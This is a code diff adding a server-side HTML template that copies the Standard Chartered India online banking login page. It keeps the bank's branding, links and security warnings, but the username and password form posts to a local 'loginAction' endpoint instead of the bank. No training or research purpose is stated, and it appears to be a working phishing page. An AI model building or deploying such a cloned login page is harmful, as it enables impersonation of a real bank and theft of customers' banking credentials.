@@ -1,0 +1,529 @@
+@(errorMessage: String)
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "/WEB/INF/xhtml1-strict.dtd">
+<!-- saved from url=(0051)https://ibank.standardchartered.co.in/nfs/login.htm -->
+<html style="display: block;">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script type="text/javascript" async="" src="@routes.Assets.versioned("Standard Chartered Online Banking_files/analytics.js.download")"></script>
+    <script async="" src="@routes.Assets.versioned("Standard Chartered Online Banking_files/gtm.js.download")"></script>
+    <script>
+var cardAvail = false;
+var loanAvail = false;
+
+		cardAvail = false;
+		//
+		loanAvail = false;
+		//
+
+var loadingURL = 'https://forms.online.standardchartered.com/public_website/india/r5paperdrop/common/error.html';
+var formBaseURL = 'https://forms.online.standardchartered.com/public_website/india/r5paperdrop/common/index.html';
+var formErrorURL = 'https://forms.online.standardchartered.com/public_website/india/r5paperdrop/common/loading.html';
+
+var appLabelMap = new Object();
+
+appLabelMap.topupLoan = 'Top-up of Personal Loan';
+appLabelMap.creditLimitIncrease = 'Credit Limit Increase';
+appLabelMap.loanOnCards = 'Loan on Cards';
+appLabelMap.supplementaryCard = 'Supplementary Card';
+
+var appIdMap = new Object();
+appIdMap.topupLoan = 'INR101';
+appIdMap.notAllCards = 'INR99';
+appIdMap.allCards = 'INR98';
+appIdMap.loanOnCards = 'INR100';
+appIdMap.supplementaryCard = 'INR97';
+
+
+
+    </script>
+    <meta http-equiv="CACHE-CONTROL" content="NO-STORE">
+    <meta http-equiv="PRAGMA" content="NO-CACHE">
+    <meta http-equiv="EXPIRES" content="-1">
+    <title> Standard Chartered Online Banking </title>
+    <link rel="stylesheet" type="text/css" href="@routes.Assets.versioned("Standard Chartered Online Banking_files/style.css")" media="all">
+    <script type="text/javascript">
+	   var isSme = false;
+
+    </script>
+    <script type="text/javascript" src="@routes.Assets.versioned("Standard Chartered Online Banking_files/script.js.download")"> </script>
+     <!-- begin: Cy Site Seal Code --> <script type="text/javascript" src="@routes.Assets.versioned("Standard Chartered Online Banking_files/siteseal.js.download")"> </script>
+    <!-- end: Cy Site Seal Code -->
+    <script type="text/javascript">
+    	var requestId = '11CDCE2C-E3BE-3E82-C9C4-2E733A6B8DF7';
+
+    </script>
+</head>
+<body>
+<form name="loginForm" action="loginAction" method="post">
+    <table cellpadding="0" cellspacing="0">
+        <tbody>
+        <tr>
+            <td align="left">
+                <table class="tbl_layout" cellpadding="0" cellspacing="0">
+                    <colgroup>
+                        <col width="1%">
+                        <col width="98%">
+                        <col width="1%">
+                    </colgroup>
+                    <tbody>
+                    <tr>
+                        <td rowspan="3">&nbsp;</td>
+                        <td>
+                            <table cellpadding="0" cellspacing="0">
+                                <colgroup>
+                                    <col width="20%" class="scb_colorbar1">
+                                    <col width="10%" class="scb_colorbar2">
+                                    <col width="15%" class="scb_colorbar3">
+                                    <col width="5%" class="scb_colorbar4">
+                                    <col width="50%" class="scb_colorbar5">
+                                </colgroup>
+                                <tbody>
+                                <tr>
+                                    <td>&nbsp;</td>
+                                    <td>&nbsp;</td>
+                                    <td>&nbsp;</td>
+                                    <td>&nbsp;</td>
+                                    <td>&nbsp;</td>
+                                </tr>
+                                </tbody>
+                            </table>
+                            <br>
+                            <table class="tbl_heading" cellpadding="0" cellspacing="0">
+                                <colgroup>
+                                    <col width="17%">
+                                    <col width="83%">
+                                </colgroup>
+                                <tbody>
+                                <tr>
+                                    <td rowspan="2"><img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/logo.gif")">
+                                    </td>
+                                    <td class="txt_mainheading">&nbsp;</td>
+                                </tr>
+                                <tr>
+                                    <td class="txt_subheading"> India</td>
+                                </tr>
+                                </tbody>
+                            </table>
+                            <br>
+                            <hr class="hr_heading">
+                        </td>
+                        <td rowspan="3">&nbsp;</td>
+                    </tr>
+                    <tr>
+                        <td><br>
+                            <table cellpadding="0" cellspacing="0">
+                                <colgroup>
+                                    <col width="8%">
+                                    <col width="84%">
+                                    <col width="8%">
+                                </colgroup>
+                                <tbody>
+                                <tr>
+                                    <td rowspan="3">&nbsp;</td>
+                                    <td class="tbl_sprt_bottom"><span class="txt_title"> Online Banking </span></td>
+                                    <td rowspan="3">&nbsp;</td>
+                                </tr>
+                                </tbody>
+                                <colgroup>
+                                    <col width="10%">
+                                    <col width="80%">
+                                    <col width="10%">
+                                </colgroup>
+                                <tbody>
+                                <tr>
+                                    <td rowspan="3">&nbsp;</td>
+                                    <td><br> <br>
+                                        <table cellpadding="0" cellspacing="0">
+                                            <tbody>
+                                            <tr>
+                                                <td>
+                                                    <table cellspacing="0">
+                                                        <colgroup>
+                                                            <col width="5%">
+                                                            <col width="95%">
+                                                        </colgroup>
+                                                        <tbody>
+                                                        <tr>
+                                                            <td class="tbl_advwarning_content"><img
+                                                                    src="@routes.Assets.versioned("Standard Chartered Online Banking_files/ico_important.gif")"
+                                                                border="0">
+                                                            </td>
+                                                            <td class="tbl_advwarning_content"><p
+                                                                    class="tbl_advwarning_title"> SECURITY BEST
+                                                                PRACTICES </p> <br> Do not share your internet banking
+                                                                password with any other applications or websites such as
+                                                                Yahoo, Gmail, Facebook, Twitter etc.
+                                                                <br>
+                                                                <br>Read more on security best practices at
+                                                                www.sc.com/global/security-tips/
+                                                                <br>
+                                                                <br>Beware of Social Media Scams :
+                                                                <br>
+                                                                <br>Are you reaching out to us via Twitter and Facebook?
+                                                                Remember, we will never send you links to access online
+                                                                banking or ask for your login details or PIN number.
+                                                            </td>
+                                                        </tr>
+                                                        <tr class="tbl_advwarning_end">
+                                                            <td colspan="2">&nbsp;</td>
+                                                        </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </td>
+                                            </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                    <td>&nbsp;</td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <table cellpadding="0" cellspacing="0">
+                                            <colgroup>
+                                                <col width="75%">
+                                                <col width="3%">
+                                                <col width="22%">
+                                            </colgroup>
+                                            <tbody>
+                                            <tr>
+                                                <td class="tbl_content_top"><p></p>
+                                                    <table cellpadding="0" cellspacing="0">
+                                                        <colgroup>
+                                                            <col width="45%">
+                                                            <col width="6%">
+                                                            <col width="49%">
+                                                        </colgroup>
+                                                        <div style="color : red">@errorMessage</div>
+                                                        <tbody>
+                                                        <tr>
+                                                            <td class="tbl_content_top">
+                                                                <table class="tbl_form" cellpadding="0" cellspacing="0">
+                                                                    <colgroup>
+                                                                        <col width="1%" class="tbl_listing_row_even">
+                                                                        <col width="28%" class="tbl_listing_row_even">
+                                                                        <col width="70%" class="tbl_listing_row_even">
+                                                                        <col width="1%" class="tbl_listing_row_even">
+                                                                    </colgroup>
+                                                                    <tbody>
+                                                                    <tr>
+                                                                        <th class="tbl_header_left">
+                                                                            <div class="border_left_grey">&nbsp;</div>
+                                                                        </th>
+                                                                        <th class="tbl_content_left" colspan="2"> Secure
+                                                                            Login
+                                                                            &nbsp;<img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/ico_secure_sml.gif")">
+                                                                        </th>
+                                                                        <th class="tbl_header_right">
+                                                                            <div class="border_right_grey">&nbsp;</div>
+                                                                        </th>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td colspan="4"><br> <br></td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>&nbsp;</td>
+                                                                        <td class="txt_highlight"> Username</td>
+                                                                        <td><input type="text" name="username"
+                                                                                   maxlength="16" size="18"
+                                                                                   autocomplete="off"></td>
+                                                                        <td>&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>&nbsp;</td>
+                                                                        <td class="txt_highlight"> Password</td>
+                                                                        <td><input type="password" name="password"
+                                                                                   maxlength="16" size="18"
+                                                                                   autocomplete="off"></td>
+                                                                        <td>&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>&nbsp;</td>
+                                                                        <td>&nbsp;</td>
+                                                                        <td><img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/arrow_blue_single_tab.gif")">
+                                                                            <a href="https://ibank.standardchartered.co.in/nfs/ral_tnc.htm?t=2-1-080AF6EB37AA817A7C340B6335CB1BCF&amp;a=doInitForgotUsrNamePasswd&amp;r=11CDCE2C-E3BE-3E82-C9C4-2E733A6B8DF7">
+                                                                                Forgot Username and Password </a></td>
+                                                                        <td>&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td colspan="4" class="tbl_content_middle"><span
+                                                                                class="button"> <input type="submit"
+                                                                                                       name="Login"
+                                                                                                       value="Login"> </span>
+                                                                            <br> <br></td>
+                                                                    </tr>
+                                                                    <tr class="tbl_listing_end">
+                                                                        <td colspan="4">&nbsp;</td>
+                                                                    </tr>
+                                                                    </tbody>
+                                                                </table>
+                                                            </td>
+                                                            <td class="tbl_content_middle"><img
+                                                                    src="@routes.Assets.versioned("Standard Chartered Online Banking_files/ico_or.gif")">
+                                                            </td>
+                                                            <td class="tbl_content_top">
+                                                                <table class="tbl_login_grey" cellpadding="0"
+                                                                       cellspacing="0">
+                                                                    <colgroup>
+                                                                        <col width="1%" class="tbl_notice_left">
+                                                                        <col width="4%" class="tbl_notice">
+                                                                        <col width="94%" class="tbl_notice">
+                                                                        <col width="1%" class="tbl_notice_right">
+                                                                    </colgroup>
+                                                                    <tbody>
+                                                                    <tr>
+                                                                        <th class="tbl_header_left">
+                                                                            <div class="border_left_grey">&nbsp;</div>
+                                                                        </th>
+                                                                        <th colspan="2" class="tbl_content_left"> New to
+                                                                            Online Banking?
+                                                                        </th>
+                                                                        <th class="tbl_header_right">
+                                                                            <div class="border_right_grey">&nbsp;</div>
+                                                                        </th>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="tbl_notice_left">&nbsp;</td>
+                                                                        <td><br> <img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/arrow_blue_single_tab.gif")">&nbsp;
+                                                                        </td>
+                                                                        <td><br> <a
+                                                                                href="https://ibank.standardchartered.co.in/nfs/ral_tnc.htm?t=2-1-080AF6EB37AA817A7C340B6335CB1BCF&amp;r=11CDCE2C-E3BE-3E82-C9C4-2E733A6B8DF7"
+                                                                                class="txt_highlight"> Instant
+                                                                            Registration </a> <span class="txt_new"> IT'S EASY!!</span>
+                                                                        </td>
+                                                                        <td class="tbl_notice_right">&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="tbl_notice_left">&nbsp;</td>
+                                                                        <td>&nbsp;</td>
+                                                                        <td>
+                                                                            <a href="https://ibank.standardchartered.co.in/nfs/ral_tnc.htm?t=2-1-080AF6EB37AA817A7C340B6335CB1BCF&amp;r=11CDCE2C-E3BE-3E82-C9C4-2E733A6B8DF7">Click
+                                                                                here</a> to instantly register for
+                                                                            Online Banking/ Breeze using your ATM or
+                                                                            Debit Card or Credit Card. <br> <br></td>
+                                                                        <td class="tbl_notice_right">&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="tbl_notice_left">&nbsp;</td>
+                                                                        <td><br> <img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/arrow_blue_single_tab.gif")">&nbsp;
+                                                                        </td>
+                                                                        <td><br> <a
+                                                                                href="https://ibank.standardchartered.co.in/nfs/ral_tnc.htm?t=2-2-080AF6EB37AA817A7C340B6335CB1BCF&amp;a=doInitFirstTimeLogin&amp;r=11CDCE2C-E3BE-3E82-C9C4-2E733A6B8DF7"
+                                                                                class="txt_highlight"> Register using
+                                                                            Temporary ID and Password </a></td>
+                                                                        <td class="tbl_notice_right">&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="tbl_notice_left">&nbsp;</td>
+                                                                        <td>&nbsp;</td>
+                                                                        <td>
+                                                                            <a href="https://ibank.standardchartered.co.in/nfs/ral_tnc.htm?t=2-2-080AF6EB37AA817A7C340B6335CB1BCF&amp;a=doInitFirstTimeLogin&amp;r=11CDCE2C-E3BE-3E82-C9C4-2E733A6B8DF7">Click
+                                                                                here</a> if you have obtained a
+                                                                            Temporary ID <br>and Password for First Time
+                                                                            Login or re-<br>registration. <br></td>
+                                                                        <td class="tbl_notice_right">&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr class="tbl_notice_left">
+                                                                        <td colspan="4">&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr class="tbl_notice_end">
+                                                                        <td colspan="4">&nbsp;</td>
+                                                                    </tr>
+                                                                    </tbody>
+                                                                </table>
+                                                            </td>
+                                                        </tr>
+                                                        </tbody>
+                                                    </table>
+                                                    <table cellpadding="0" cellspacing="0">
+                                                        <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <!--a href="/nfs/ral_tnc.htm?t=2-1-080AF6EB37AA817A7C340B6335CB1BCF"> <img src="/nfs/ibank/theme/default/images/banner_ad_1.jpg" alt="What's New Promotion"/> </a-->
+                                                                <script>
+                                                                    function resizeIframe(height,frameName){document.getElementById(frameName).height = height;}
+                                                                </script>
+                                                            </td>
+                                                        </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </td>
+                                                <td>&nbsp;</td>
+                                                <td class="tbl_content_top">
+                                                    <table cellpadding="0" cellspacing="0">
+                                                        <tbody>
+                                                        <tr>
+                                                            <td class="tbl_content_top">
+                                                                <table class="tbl_info_green" cellpadding="0"
+                                                                       cellspacing="0">
+                                                                    <colgroup>
+                                                                        <col width="1%" class="tbl_notice_left">
+                                                                        <col width="98%" class="tbl_notice">
+                                                                        <col width="1%" class="tbl_notice_right">
+                                                                    </colgroup>
+                                                                    <tbody>
+                                                                    <tr>
+                                                                        <th class="tbl_header_left">
+                                                                            <div class="border_left_green">&nbsp;</div>
+                                                                        </th>
+                                                                        <th class="tbl_content_left"> Need Help?
+                                                                        </th>
+                                                                        <th class="tbl_header_right">
+                                                                            <div class="border_right_green">&nbsp;</div>
+                                                                        </th>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td>&nbsp;</td>
+                                                                        <td>
+                                                                            <ul class="grnList">
+                                                                                <li><b>24/7 Phone Assistance</b><br>Please
+                                                                                    call
+                                                                                    <a href="http://www.standardchartered.co.in/personal/ways-to-bank/en/phone-banking12.html"
+                                                                                       target="new_window">Phone
+                                                                                        Banking</a> <br>or <a
+                                                                                            href="mailto:customer.care@@sc.com">email
+                                                                                        us</a></li>
+                                                                                <li>
+                                                                                    <a href="http://www.standardchartered.co.in/_documents/tnc/index.html"
+                                                                                       target="new_window"> Frequently
+                                                                                        Asked Questions </a></li>
+                                                                                <li>
+                                                                                    <a href="http://www.standardchartered.co.in/_documents/Website_Maintenance_Schedule_3.html"
+                                                                                       target="new_window">Website
+                                                                                        Maintenance Schedule</a></li>
+                                                                            </ul>
+                                                                        </td>
+                                                                        <td>&nbsp;</td>
+                                                                    </tr>
+                                                                    <tr class="tbl_info_green_bottom">
+                                                                        <td colspan="100%"><b class="green_border"> <b
+                                                                                class="green_border4"> </b> <b
+                                                                                class="green_border3"> </b> <b
+                                                                                class="green_border2"> <b> </b> </b> <b
+                                                                                class="green_border1"> <b> </b> </b>
+                                                                        </b></td>
+                                                                    </tr>
+                                                                    </tbody>
+                                                                </table>
+                                                                <br>
+                                                                <table>
+                                                                    <tbody>
+                                                                    <tr>
+                                                                        <td class="tbl_content_top"><a
+                                                                                href="http://www.standardchartered.co.in/personal/online-mobile-services/breeze-mobile/en/"
+                                                                                target="new_window"
+                                                                                alt="Bank with Breeze Mobile"> <img
+                                                                                src="@routes.Assets.versioned("Standard Chartered Online Banking_files/SC-Mobile_B.jpg")">
+                                                                        </a></td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td class="tbl_content_top"><a
+                                                                                href="http://www.standardchartered.com/en/online-banking/security/index.html"
+                                                                                target="new_window" alt="Security Tips">
+                                                                            <img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/banner_security.jpg")">
+                                                                        </a></td>
+                                                                    </tr>
+                                                                    </tbody>
+                                                                </table>
+                                                            </td>
+                                                        </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td class="tbl_content_top txt_note_disclamer"> It is essential that you
+                                                    do not take into consideration or respond to any information on this
+                                                    site or send any information<br>or materials to us before you read
+                                                    this
+                                                    <a href="http://www.standardchartered.co.in/_documents/tnc/disclaimer.html"
+                                                       target="new_window">Important Legal Notice</a>, <a
+                                                            href="http://www.standardchartered.co.in/_documents/tnc/svc_cc4deposits.html"
+                                                            target="new_window">Client Charter</a> and our <a
+                                                            href="http://www.standardchartered.co.in/_documents/tnc/datapp.html"
+                                                            target="new_window">Data Protection and Privacy
+                                                        <br>Policy</a>.
+                                                </td>
+                                                <td>&nbsp;</td>
+                                            </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                                </tbody>
+                            </table>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <script>
+var cardAvail = false;
+var loanAvail = false;
+
+		cardAvail = false;
+		//
+		loanAvail = false;
+		//
+
+var loadingURL = 'https://forms.online.standardchartered.com/public_website/india/r5paperdrop/common/error.html';
+var formBaseURL = 'https://forms.online.standardchartered.com/public_website/india/r5paperdrop/common/index.html';
+var formErrorURL = 'https://forms.online.standardchartered.com/public_website/india/r5paperdrop/common/loading.html';
+
+var appLabelMap = new Object();
+
+appLabelMap.topupLoan = 'Top-up of Personal Loan';
+appLabelMap.creditLimitIncrease = 'Credit Limit Increase';
+appLabelMap.loanOnCards = 'Loan on Cards';
+appLabelMap.supplementaryCard = 'Supplementary Card';
+
+var appIdMap = new Object();
+appIdMap.topupLoan = 'INR101';
+appIdMap.notAllCards = 'INR99';
+appIdMap.allCards = 'INR98';
+appIdMap.loanOnCards = 'INR100';
+appIdMap.supplementaryCard = 'INR97';
+
+
+
+                            </script>
+                            <br> <br> <br> <br>
+                            <hr class="hr_heading">
+                            <br>
+                            <script type="text/javascript">
+	var dataLayer = [];
+
+                            </script>
+                            <script>
+(
+		function(w,d,s,l,i){
+			w[l]=w[l]||[];
+			w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});
+			var f=d.getElementsByTagName(s)[0],
+			j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';
+			j.async=true;
+			j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;
+			f.parentNode.insertBefore(j,f);
+})
+(window,document,'script','dataLayer','GTM-NK6NQ3Z');
+
+                            </script>
+                            Copyright © 2006-2014 Standard Chartered Bank
+                            &nbsp;<span class="txt_seperator">|</span>&nbsp;
+                            <img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/arrow_blue_single_tab.gif")">
+                            <a href="http://www.standardchartered.co.in/_documents/tnc/electronicbankingterms.htm"
+                               class="navcontainer_nav_1" id="nav_terms_conditions" target="new_window"> Terms &amp;
+                                Conditions </a>
+                            &nbsp;<span class="txt_seperator">|</span>&nbsp;
+                            <img src="@routes.Assets.versioned("Standard Chartered Online Banking_files/arrow_blue_single_tab.gif")">
+                            <a href="http://www.standardchartered.co.in/_documents/tnc/datapp.html" target="new_window">
+                                Data Protection and Privacy Policy </a></td>
+                    </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+        </tbody>
+    </table>
+    <input type="hidden" name="t" value="2-0-080AF6EB37AA817A7C340B6335CB1BCF">
+</form>
+</body>
+</html>
